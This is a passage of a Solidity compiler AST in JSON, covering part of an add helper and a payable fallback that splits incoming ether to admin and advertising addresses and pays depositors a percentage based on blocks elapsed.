                "name": "ParameterList",
                "src": "911:11:0"
              },
              {
                "children": [
                  {
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "operator": "=",
                          "type": "uint256"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 103,
                              "type": "uint256",
                              "value": "c"
                            },
                            "id": 105,
                            "name": "Identifier",
                            "src": "929:1:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "commonType": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              },
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "operator": "+",
                              "type": "uint256"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 98,
                                  "type": "uint256",
                                  "value": "_a"
                                },
                                "id": 106,
                                "name": "Identifier",
                                "src": "933:2:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 100,
                                  "type": "uint256",
                                  "value": "_b"
                                },
                                "id": 107,
                                "name": "Identifier",
                                "src": "938:2:0"
                              }
                            ],
                            "id": 108,
                            "name": "BinaryOperation",
                            "src": "933:7:0"
                          }
                        ],
                        "id": 109,
                        "name": "Assignment",
                        "src": "929:11:0"
                      }
                    ],
                    "id": 110,
                    "name": "ExpressionStatement",
                    "src": "929:11:0"
                  },
                  {
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "isStructConstructorCall": false,
                          "lValueRequested": false,
                          "names": [
                            null
                          ],
                          "type": "tuple()",
                          "type_conversion": false
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_bool",
                                  "typeString": "bool"
                                }
                              ],
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 348,
                              "type": "function (bool) pure",
                              "value": "assert"
                            },
                            "id": 111,
                            "name": "Identifier",
                            "src": "946:6:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "commonType": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              },
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "operator": ">=",
                              "type": "bool"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 103,
                                  "type": "uint256",
                                  "value": "c"
                                },
                                "id": 112,
                                "name": "Identifier",
                                "src": "953:1:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 98,
                                  "type": "uint256",
                                  "value": "_a"
                                },
                                "id": 113,
                                "name": "Identifier",
                                "src": "958:2:0"
                              }
                            ],
                            "id": 114,
                            "name": "BinaryOperation",
                            "src": "953:7:0"
                          }
                        ],
                        "id": 115,
                        "name": "FunctionCall",
                        "src": "946:15:0"
                      }
                    ],
                    "id": 116,
                    "name": "ExpressionStatement",
                    "src": "946:15:0"
                  },
                  {
                    "attributes": {
                      "functionReturnParameters": 104
                    },
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "overloadedDeclarations": [
                            null
                          ],
                          "referencedDeclaration": 103,
                          "type": "uint256",
                          "value": "c"
                        },
                        "id": 117,
                        "name": "Identifier",
                        "src": "974:1:0"
                      }
                    ],
                    "id": 118,
                    "name": "Return",
                    "src": "967:8:0"
                  }
                ],
                "id": 119,
                "name": "Block",
                "src": "923:57:0"
              }
            ],
            "id": 120,
            "name": "FunctionDefinition",
            "src": "852:128:0"
          },
          {
            "attributes": {
              "constant": false,
              "documentation": null,
              "implemented": true,
              "isConstructor": false,
              "modifiers": [
                null
              ],
              "name": "",
              "payable": true,
              "scope": 344,
              "stateMutability": "payable",
              "superFunction": null,
              "visibility": "external"
            },
            "children": [
              {
                "attributes": {
                  "parameters": [
                    null
                  ]
                },
                "children": [],
                "id": 121,
                "name": "ParameterList",
                "src": "990:2:0"
              },
              {
                "attributes": {
                  "parameters": [
                    null
                  ]
                },
                "children": [],
                "id": 122,
                "name": "ParameterList",
                "src": "1010:0:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "assignments": [
                        124
                      ]
                    },
                    "children": [
                      {
                        "attributes": {
                          "constant": false,
                          "name": "admRefPerc",
                          "scope": 269,
                          "stateVariable": false,
                          "storageLocation": "default",
                          "type": "uint256",
                          "value": null,
                          "visibility": "internal"
                        },
                        "children": [
                          {
                            "attributes": {
                              "name": "uint256",
                              "type": "uint256"
                            },
                            "id": 123,
                            "name": "ElementaryTypeName",
                            "src": "1014:7:0"
                          }
                        ],
                        "id": 124,
                        "name": "VariableDeclaration",
                        "src": "1014:18:0"
                      },
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "isStructConstructorCall": false,
                          "lValueRequested": false,
                          "names": [
                            null
                          ],
                          "type": "uint256",
                          "type_conversion": false
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                },
                                {
                                  "typeIdentifier": "t_rational_100_by_1",
                                  "typeString": "int_const 100"
                                }
                              ],
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 76,
                              "type": "function (uint256,uint256) pure returns (uint256)",
                              "value": "div"
                            },
                            "id": 125,
                            "name": "Identifier",
                            "src": "1035:3:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "isStructConstructorCall": false,
                              "lValueRequested": false,
                              "names": [
                                null
                              ],
                              "type": "uint256",
                              "type_conversion": false
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    },
                                    {
                                      "typeIdentifier": "t_rational_5_by_1",
                                      "typeString": "int_const 5"
                                    }
                                  ],
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 62,
                                  "type": "function (uint256,uint256) pure returns (uint256)",
                                  "value": "mul"
                                },
                                "id": 126,
                                "name": "Identifier",
                                "src": "1039:3:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "member_name": "value",
                                  "referencedDeclaration": null,
                                  "type": "uint256"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 359,
                                      "type": "msg",
                                      "value": "msg"
                                    },
                                    "id": 127,
                                    "name": "Identifier",
                                    "src": "1043:3:0"
                                  }
                                ],
                                "id": 128,
                                "name": "MemberAccess",
                                "src": "1043:9:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "hexvalue": "35",
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "lValueRequested": false,
                                  "subdenomination": null,
                                  "token": "number",
                                  "type": "int_const 5",
                                  "value": "5"
                                },
                                "id": 129,
                                "name": "Literal",
                                "src": "1053:1:0"
                              }
                            ],
                            "id": 130,
                            "name": "FunctionCall",
                            "src": "1039:16:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "hexvalue": "313030",
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "subdenomination": null,
                              "token": "number",
                              "type": "int_const 100",
                              "value": "100"
                            },
                            "id": 131,
                            "name": "Literal",
                            "src": "1056:3:0"
                          }
                        ],
                        "id": 132,
                        "name": "FunctionCall",
                        "src": "1035:25:0"
                      }
                    ],
                    "id": 133,
                    "name": "VariableDeclarationStatement",
                    "src": "1014:46:0"
                  },
                  {
                    "attributes": {
                      "assignments": [
                        135
                      ]
                    },
                    "children": [
                      {
                        "attributes": {
                          "constant": false,
                          "name": "advPerc",
                          "scope": 269,
                          "stateVariable": false,
                          "storageLocation": "default",
                          "type": "uint256",
                          "value": null,
                          "visibility": "internal"
                        },
                        "children": [
                          {
                            "attributes": {
                              "name": "uint256",
                              "type": "uint256"
                            },
                            "id": 134,
                            "name": "ElementaryTypeName",
                            "src": "1064:7:0"
                          }
                        ],
                        "id": 135,
                        "name": "VariableDeclaration",
                        "src": "1064:15:0"
                      },
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "isStructConstructorCall": false,
                          "lValueRequested": false,
                          "names": [
                            null
                          ],
                          "type": "uint256",
                          "type_conversion": false
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                },
                                {
                                  "typeIdentifier": "t_rational_100_by_1",
                                  "typeString": "int_const 100"
                                }
                              ],
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 76,
                              "type": "function (uint256,uint256) pure returns (uint256)",
                              "value": "div"
                            },
                            "id": 136,
                            "name": "Identifier",
                            "src": "1082:3:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "isStructConstructorCall": false,
                              "lValueRequested": false,
                              "names": [
                                null
                              ],
                              "type": "uint256",
                              "type_conversion": false
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    },
                                    {
                                      "typeIdentifier": "t_rational_10_by_1",
                                      "typeString": "int_const 10"
                                    }
                                  ],
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 62,
                                  "type": "function (uint256,uint256) pure returns (uint256)",
                                  "value": "mul"
                                },
                                "id": 137,
                                "name": "Identifier",
                                "src": "1086:3:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "member_name": "value",
                                  "referencedDeclaration": null,
                                  "type": "uint256"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 359,
                                      "type": "msg",
                                      "value": "msg"
                                    },
                                    "id": 138,
                                    "name": "Identifier",
                                    "src": "1090:3:0"
                                  }
                                ],
                                "id": 139,
                                "name": "MemberAccess",
                                "src": "1090:9:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "hexvalue": "3130",
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "lValueRequested": false,
                                  "subdenomination": null,
                                  "token": "number",
                                  "type": "int_const 10",
                                  "value": "10"
                                },
                                "id": 140,
                                "name": "Literal",
                                "src": "1100:2:0"
                              }
                            ],
                            "id": 141,
                            "name": "FunctionCall",
                            "src": "1086:17:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "hexvalue": "313030",
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "subdenomination": null,
                              "token": "number",
                              "type": "int_const 100",
                              "value": "100"
                            },
                            "id": 142,
                            "name": "Literal",
                            "src": "1104:3:0"
                          }
                        ],
                        "id": 143,
                        "name": "FunctionCall",
                        "src": "1082:26:0"
                      }
                    ],
                    "id": 144,
                    "name": "VariableDeclarationStatement",
                    "src": "1064:44:0"
                  },
                  {
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "isStructConstructorCall": false,
                          "lValueRequested": false,
                          "names": [
                            null
                          ],
                          "type": "tuple()",
                          "type_conversion": false
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              ],
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "member_name": "transfer",
                              "referencedDeclaration": null,
                              "type": "function (uint256)"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 7,
                                  "type": "address",
                                  "value": "advAddress"
                                },
                                "id": 145,
                                "name": "Identifier",
                                "src": "1113:10:0"
                              }
                            ],
                            "id": 147,
                            "name": "MemberAccess",
                            "src": "1113:19:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 135,
                              "type": "uint256",
                              "value": "advPerc"
                            },
                            "id": 148,
                            "name": "Identifier",
                            "src": "1133:7:0"
                          }
                        ],
                        "id": 149,
                        "name": "FunctionCall",
                        "src": "1113:28:0"
                      }
                    ],
                    "id": 150,
                    "name": "ExpressionStatement",
                    "src": "1113:28:0"
                  },
                  {
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "isStructConstructorCall": false,
                          "lValueRequested": false,
                          "names": [
                            null
                          ],
                          "type": "tuple()",
                          "type_conversion": false
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              ],
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "member_name": "transfer",
                              "referencedDeclaration": null,
                              "type": "function (uint256)"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 4,
                                  "type": "address",
                                  "value": "admAddress"
                                },
                                "id": 151,
                                "name": "Identifier",
                                "src": "1145:10:0"
                              }
                            ],
                            "id": 153,
                            "name": "MemberAccess",
                            "src": "1145:19:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 124,
                              "type": "uint256",
                              "value": "admRefPerc"
                            },
                            "id": 154,
                            "name": "Identifier",
                            "src": "1165:10:0"
                          }
                        ],
                        "id": 155,
                        "name": "FunctionCall",
                        "src": "1145:31:0"
                      }
                    ],
                    "id": 156,
                    "name": "ExpressionStatement",
                    "src": "1145:31:0"
                  },
                  {
                    "attributes": {
                      "falseBody": null
                    },
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "operator": "!=",
                          "type": "bool"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "isConstant": false,
                              "isLValue": true,
                              "isPure": false,
                              "lValueRequested": false,
                              "type": "uint256"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 11,
                                  "type": "mapping(address => uint256)",
                                  "value": "deposited"
                                },
                                "id": 157,
                                "name": "Identifier",
                                "src": "1185:9:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "member_name": "sender",
                                  "referencedDeclaration": null,
                                  "type": "address"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 359,
                                      "type": "msg",
                                      "value": "msg"
                                    },
                                    "id": 158,
                                    "name": "Identifier",
                                    "src": "1195:3:0"
                                  }
                                ],
                                "id": 159,
                                "name": "MemberAccess",
                                "src": "1195:10:0"
                              }
                            ],
                            "id": 160,
                            "name": "IndexAccess",
                            "src": "1185:21:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "hexvalue": "30",
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "subdenomination": null,
                              "token": "number",
                              "type": "int_const 0",
                              "value": "0"
                            },
                            "id": 161,
                            "name": "Literal",
                            "src": "1210:1:0"
                          }
                        ],
                        "id": 162,
                        "name": "BinaryOperation",
                        "src": "1185:26:0"
                      },
                      {
                        "children": [
                          {
                            "attributes": {
                              "assignments": [
                                164
                              ]
                            },
                            "children": [
                              {
                                "attributes": {
                                  "constant": false,
                                  "name": "investor",
                                  "scope": 269,
                                  "stateVariable": false,
                                  "storageLocation": "default",
                                  "type": "address",
                                  "value": null,
                                  "visibility": "internal"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "name": "address",
                                      "type": "address"
                                    },
                                    "id": 163,
                                    "name": "ElementaryTypeName",
                                    "src": "1218:7:0"
                                  }
                                ],
                                "id": 164,
                                "name": "VariableDeclaration",
                                "src": "1218:16:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "member_name": "sender",
                                  "referencedDeclaration": null,
                                  "type": "address"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 359,
                                      "type": "msg",
                                      "value": "msg"
                                    },
                                    "id": 165,
                                    "name": "Identifier",
                                    "src": "1237:3:0"
                                  }
                                ],
                                "id": 166,
                                "name": "MemberAccess",
                                "src": "1237:10:0"
                              }
                            ],
                            "id": 167,
                            "name": "VariableDeclarationStatement",
                            "src": "1218:29:0"
                          },
                          {
                            "attributes": {
                              "assignments": [
                                169
                              ]
                            },
                            "children": [
                              {
                                "attributes": {
                                  "constant": false,
                                  "name": "depositsPercents",
                                  "scope": 269,
                                  "stateVariable": false,
                                  "storageLocation": "default",
                                  "type": "uint256",
                                  "value": null,
                                  "visibility": "internal"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "name": "uint256",
                                      "type": "uint256"
                                    },
                                    "id": 168,
                                    "name": "ElementaryTypeName",
                                    "src": "1252:7:0"
                                  }
                                ],
                                "id": 169,
                                "name": "VariableDeclaration",
                                "src": "1252:24:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "isStructConstructorCall": false,
                                  "lValueRequested": false,
                                  "names": [
                                    null
                                  ],
                                  "type": "uint256",
                                  "type_conversion": false
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_uint256",
                                          "typeString": "uint256"
                                        },
                                        {
                                          "typeIdentifier": "t_rational_5900_by_1",
                                          "typeString": "int_const 5900"
                                        }
                                      ],
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 76,
                                      "type": "function (uint256,uint256) pure returns (uint256)",
                                      "value": "div"
                                    },
                                    "id": 170,
                                    "name": "Identifier",
                                    "src": "1279:3:0"
                                  },
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": false,
                                      "isStructConstructorCall": false,
                                      "lValueRequested": false,
                                      "names": [
                                        null
                                      ],
                                      "type": "uint256",
                                      "type_conversion": false
                                    },
                                    "children": [
                                      {
                                        "attributes": {
                                          "argumentTypes": [
                                            {
                                              "typeIdentifier": "t_uint256",
                                              "typeString": "uint256"
                                            },
                                            {
                                              "typeIdentifier": "t_uint256",
                                              "typeString": "uint256"
                                            }
                                          ],
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 62,
                                          "type": "function (uint256,uint256) pure returns (uint256)",
                                          "value": "mul"
                                        },
                                        "id": 171,
                                        "name": "Identifier",
                                        "src": "1283:3:0"
                                      },
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "isConstant": false,
                                          "isLValue": false,
                                          "isPure": false,
                                          "isStructConstructorCall": false,
                                          "lValueRequested": false,
                                          "names": [
                                            null
                                          ],
                                          "type": "uint256",
                                          "type_conversion": false
                                        },
                                        "children": [
                                          {
                                            "attributes": {
                                              "argumentTypes": [
                                                {
                                                  "typeIdentifier": "t_uint256",
                                                  "typeString": "uint256"
                                                },
                                                {
                                                  "typeIdentifier": "t_rational_100_by_1",
                                                  "typeString": "int_const 100"
                                                }
                                              ],
                                              "overloadedDeclarations": [
                                                null
                                              ],
                                              "referencedDeclaration": 76,
                                              "type": "function (uint256,uint256) pure returns (uint256)",
                                              "value": "div"
                                            },
                                            "id": 172,
                                            "name": "Identifier",
                                            "src": "1287:3:0"
                                          },
                                          {
                                            "attributes": {
                                              "argumentTypes": null,
                                              "isConstant": false,
                                              "isLValue": false,
                                              "isPure": false,
                                              "isStructConstructorCall": false,
                                              "lValueRequested": false,
                                              "names": [
                                                null
                                              ],
                                              "type": "uint256",
                                              "type_conversion": false
                                            },
                                            "children": [
                                              {
                                                "attributes": {
                                                  "argumentTypes": [
                                                    {
                                                      "typeIdentifier": "t_uint256",
                                                      "typeString": "uint256"
                                                    },
                                                    {
                                                      "typeIdentifier": "t_rational_4_by_1",
                                                      "typeString": "int_const 4"
                                                    }
                                                  ],
                                                  "overloadedDeclarations": [
                                                    null
                                                  ],
                                                  "referencedDeclaration": 62,
                                                  "type": "function (uint256,uint256) pure returns (uint256)",
                                                  "value": "mul"
                                                },
                                                "id": 173,
                                                "name": "Identifier",
                                                "src": "1291:3:0"
                                              },
                                              {
                                                "attributes": {
                                                  "argumentTypes": null,
                                                  "isConstant": false,
                                                  "isLValue": true,
                                                  "isPure": false,
                                                  "lValueRequested": false,
                                                  "type": "uint256"
                                                },
                                                "children": [
                                                  {
                                                    "attributes": {
                                                      "argumentTypes": null,
                                                      "overloadedDeclarations": [
                                                        null
                                                      ],
                                                      "referencedDeclaration": 11,
                                                      "type": "mapping(address => uint256)",
                                                      "value": "deposited"
                                                    },
                                                    "id": 174,
                                                    "name": "Identifier",
                                                    "src": "1295:9:0"
                                                  },
                                                  {
                                                    "attributes": {
                                                      "argumentTypes": null,
                                                      "isConstant": false,
                                                      "isLValue": false,
                                                      "isPure": false,
                                                      "lValueRequested": false,
                                                      "member_name": "sender",
                                                      "referencedDeclaration": null,
                                                      "type": "address"
                                                    },
                                                    "children": [
                                                      {
                                                        "attributes": {
                                                          "argumentTypes": null,
                                                          "overloadedDeclarations": [
                                                            null
                                                          ],
                                                          "referencedDeclaration": 359,
                                                          "type": "msg",
                                                          "value": "msg"
                                                        },
                                                        "id": 175,
                                                        "name": "Identifier",
                                                        "src": "1305:3:0"
                                                      }
                                                    ],
                                                    "id": 176,
                                                    "name": "MemberAccess",
                                                    "src": "1305:10:0"
                                                  }
                                                ],
                                                "id": 177,
                                                "name": "IndexAccess",
                                                "src": "1295:21:0"
                                              },
                                              {
                                                "attributes": {
                                                  "argumentTypes": null,
                                                  "hexvalue": "34",
                                                  "isConstant": false,
                                                  "isLValue": false,
                                                  "isPure": true,
                                                  "lValueRequested": false,
                                                  "subdenomination": null,
                                                  "token": "number",
                                                  "type": "int_const 4",
                                                  "value": "4"
                                                },
                                                "id": 178,
                                                "name": "Literal",
                                                "src": "1317:1:0"
                                              }
                                            ],
                                            "id": 179,
                                            "name": "FunctionCall",
                                            "src": "1291:28:0"
                                          },
                                          {
                                            "attributes": {
                                              "argumentTypes": null,
                                              "hexvalue": "313030",
                                              "isConstant": false,
                                              "isLValue": false,
                                              "isPure": true,
                                              "lValueRequested": false,
                                              "subdenomination": null,
                                              "token": "number",
                                              "type": "int_const 100",
                                              "value": "100"
                                            },
                                            "id": 180,
                                            "name": "Literal",
                                            "src": "1320:3:0"
                                          }
                                        ],
                                        "id": 181,
                                        "name": "FunctionCall",
                                        "src": "1287:37:0"
                                      },
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "commonType": {
                                            "typeIdentifier": "t_uint256",
                                            "typeString": "uint256"
                                          },
                                          "isConstant": false,
                                          "isLValue": false,
                                          "isPure": false,
                                          "lValueRequested": false,
                                          "operator": "-",
                                          "type": "uint256"
                                        },
                                        "children": [
                                          {
                                            "attributes": {
                                              "argumentTypes": null,
                                              "isConstant": false,
                                              "isLValue": false,
                                              "isPure": false,
                                              "lValueRequested": false,
                                              "member_name": "number",
                                              "referencedDeclaration": null,
                                              "type": "uint256"
                                            },
                                            "children": [
                                              {
                                                "attributes": {
                                                  "argumentTypes": null,
                                                  "overloadedDeclarations": [
                                                    null
                                                  ],
                                                  "referencedDeclaration": 349,
                                                  "type": "block",
                                                  "value": "block"
                                                },
                                                "id": 182,
                                                "name": "Identifier",
                                                "src": "1325:5:0"
                                              }
                                            ],
                                            "id": 183,
                                            "name": "MemberAccess",
                                            "src": "1325:12:0"
                                          },
                                          {
                                            "attributes": {
                                              "argumentTypes": null,
                                              "isConstant": false,
                                              "isLValue": true,
                                              "isPure": false,
                                              "lValueRequested": false,
                                              "type": "uint256"
                                            },
                                            "children": [
                                              {
                                                "attributes": {
                                                  "argumentTypes": null,
                                                  "overloadedDeclarations": [
                                                    null
                                                  ],
                                                  "referencedDeclaration": 23,
                                                  "type": "mapping(address => uint256)",
                                                  "value": "blocklock"
                                                },
                                                "id": 184,
                                                "name": "Identifier",
                                                "src": "1338:9:0"
                                              },
                                              {
                                                "attributes": {
                                                  "argumentTypes": null,
                                                  "isConstant": false,
                                                  "isLValue": false,
                                                  "isPure": false,
                                                  "lValueRequested": false,
                                                  "member_name": "sender",
                                                  "referencedDeclaration": null,
                                                  "type": "address"
                                                },
                                                "children": [
                                                  {
                                                    "attributes": {
                                                      "argumentTypes": null,
                                                      "overloadedDeclarations": [
                                                        null
                                                      ],
                                                      "referencedDeclaration": 359,
                                                      "type": "msg",
                                                      "value": "msg"
                                                    },
                                                    "id": 185,
                                                    "name": "Identifier",
                                                    "src": "1348:3:0"
                                                  }
                                                ],
                                                "id": 186,
                                                "name": "MemberAccess",
                                                "src": "1348:10:0"
                                              }
                                            ],
                                            "id": 187,
                                            "name": "IndexAccess",
                                            "src": "1338:21:0"
                                          }
                                        ],
                                        "id": 188,
                                        "name": "BinaryOperation",
                                        "src": "1325:34:0"
                                      }
                                    ],
                                    "id": 189,
                                    "name": "FunctionCall",
                                    "src": "1283:77:0"
                                  },
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "hexvalue": "35393030",
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": true,
                                      "lValueRequested": false,
                                      "subdenomination": null,
                                      "token": "number",
                                      "type": "int_const 5900",
                                      "value": "5900"
                                    },
                                    "id": 190,
                                    "name": "Literal",
                                    "src": "1361:4:0"
                                  }
                                ],
                                "id": 191,
                                "name": "FunctionCall",
                                "src": "1279:87:0"
                              }
                            ],
                            "id": 192,
                            "name": "VariableDeclarationStatement",
                            "src": "1252:114:0"
                          },
                          {
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "isStructConstructorCall": false,
                                  "lValueRequested": false,
                                  "names": [
                                    null
                                  ],
                                  "type": "tuple()",
                                  "type_conversion": false
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_uint256",
                                          "typeString": "uint256"
                                        }
                                      ],
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": false,
                                      "lValueRequested": false,
                                      "member_name": "transfer",
                                      "referencedDeclaration": null,
                                      "type": "function (uint256)"
                                    },
                                    "children": [
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 164,
                                          "type": "address",
                                          "value": "investor"
                                        },
                                        "id": 193,
                                        "name": "Identifier",
                                        "src": "1371:8:0"
                                      }
                                    ],
                                    "id": 195,
                                    "name": "MemberAccess",
                                    "src": "1371:17:0"
                                  },
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 169,
                                      "type": "uint256",
                                      "value": "depositsPercents"
                                    },
                                    "id": 196,
                                    "name": "Identifier",
                                    "src": "1389:16:0"
                                  }
                                ],
                                "id": 197,
                                "name": "FunctionCall",
                                "src": "1371:35:0"
                              }
                            ],
                            "id": 198,
                            "name": "ExpressionStatement",
                            "src": "1371:35:0"
                          },
                          {
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "operator": "+=",
                                  "type": "uint256"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "isConstant": false,
                                      "isLValue": true,
                                      "isPure": false,
                                      "lValueRequested": true,
                                      "type": "uint256"
                                    },
                                    "children": [
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 15,
                                          "type": "mapping(address => uint256)",
                                          "value": "withdrew"
                                        },
                                        "id": 199,
                                        "name": "Identifier",
                                        "src": "1412:8:0"
                                      },
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "isConstant": false,
